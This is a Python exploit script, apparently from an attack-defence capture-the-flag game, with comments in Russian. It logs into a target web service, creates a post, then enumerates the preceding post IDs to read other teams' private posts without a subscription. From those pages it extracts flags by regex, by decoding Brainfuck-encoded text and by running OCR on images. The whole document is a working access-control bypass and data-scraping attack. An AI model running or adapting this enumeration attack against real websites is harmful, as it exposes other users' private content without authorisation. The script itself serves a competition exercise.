#!/usr/bin/env python3

# Четвертая уязвимость - возможность смотреть посты без подписки
import requests
from requests.auth import HTTPBasicAuth
import json
import time
import easyocr
from hashlib import md5
import re
import sys
 
import bfParser

ip = sys.argv[1]

with requests.Session() as s:
    p = s.get('http://{}:5000/login'.format(ip))
    csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username=wee&password=wee&submit=Sign+In'.format(csrf[0]).encode('UTF-8'), headers = headers)
    data = 'csrf_token={}&title=a&text=b'.format(csrf[0]).encode('UTF-8')
    p = s.post('http://{}:5000/create-post'.format(ip), data = data, headers = headers)
    posts = re.findall('<a href="/post/(\d*)" class="btn btn-outline-secondary"> View post </a>', p.text)
    #
    print(posts)
    for i in range(int(posts[0])-10, int(posts[0])):
        p = s.get('http://{}:5000/post/{}'.format(ip, i))
        posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
        print(posts) # Получили все флаги, хранящиеся в открытом виде
        
        posts = re.findall('">([\-\[\&gt;+l\]\.]+)<[\/]', p.text)
        for bf in posts:
            bf = bf.replace("&gt;",">")
            bf = bf.replace("&lt;","<")
            res = bfParser.evaluate(bf)
            print(res) # Получили флаги, хранящиеся в виде брейнфак кода

        
        images = re.findall('src=" /image/(.*).png"', p.text)
        for image in images:
            p = s.get('http://{}:5000/image/{}.png'.format(ip, image))
            if p.status_code == 200:
                with open("321.png", 'wb') as f:
                    f.write(p.content)
            reader = easyocr.Reader(['en'])
            result = reader.readtext('321.png', detail = 0)
            result = ' '.join(result)
            nums = re.findall(r'\d\d', result)
            flag2 = ''.join((chr(int(c))) for c in nums)
            print(flag2) # Получили флаги из картинок
